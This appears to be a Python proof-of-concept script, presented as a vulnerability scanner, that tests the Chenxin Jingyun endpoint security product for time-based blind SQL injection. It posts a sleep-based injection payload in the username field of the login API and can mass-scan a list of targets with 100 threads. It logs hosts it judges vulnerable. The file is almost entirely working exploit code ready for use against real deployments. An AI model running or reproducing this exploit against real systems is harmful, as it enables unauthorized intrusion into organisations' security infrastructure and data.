import sys
import argparse
import requests
import time
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
┌──────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│                         ┌─────────────────────────────────────┐              │
│                         │               ( •_•)                │              │
│                         │              / ︻╦╤─                               
│                         │             | 辰信安全漏洞扫描工具                
│                         │              \─╤╦═                  │              │
│                         └─────────────────────────────────────┘              │
│                                                                              │
│                  * 🚀🛡️🔐🔍 - 扫描系统的潜在漏洞，保持系统安全！author:QXQ         │
│                  * 🛠️📈🔍 - 定期使用，修复问题，减少风险！     date:2024-09-3    
│                  * 🕵️‍♂️💻🔧 - 保障系统稳定，防止攻击！          version:1.0.0 
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="辰信景云终端安全漏洞扫描工具")
    parser.add_argument('-u', '--url', dest='url', type=str, help='请输入你的 URL')
    parser.add_argument('-f', '--file', dest='file', type=str, help='请输入你的文件')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            url_list = [url.strip() for url in f.readlines()]
        with Pool(100) as mp:
            mp.map(poc, url_list)
            mp.close()
            mp.join()

    else:
        print(f"使用方法：\n\tpython3 {sys.argv[0]} -h 或 --help")

def poc(target):
    payload = '/api/user/login'
    headers = {
        'Content-Length': '102',
        'Sec-Ch-Ua': '"Chromium";v="109", "Not_A Brand";v="99"',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN, zh;q=0.9'
    }
    data = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='"

    try:
        res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False, timeout=15)
        res2 = requests.post(url=target, data=data, headers=headers, verify=False, timeout=15)
        time1 = res1.elapsed.total_seconds()
        time2 = res2.elapsed.total_seconds()
        if time1 - time2 >= 5 and time1 > 5:
            print(f"[+] {target} 存在延时注入漏洞")
            with open('辰信漏洞.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f"[-] {target} 不存在延时注入漏洞")
    except requests.RequestException as e:
        print(f"[-] {target} 请求失败: {e}")

if __name__ == '__main__':
    main()
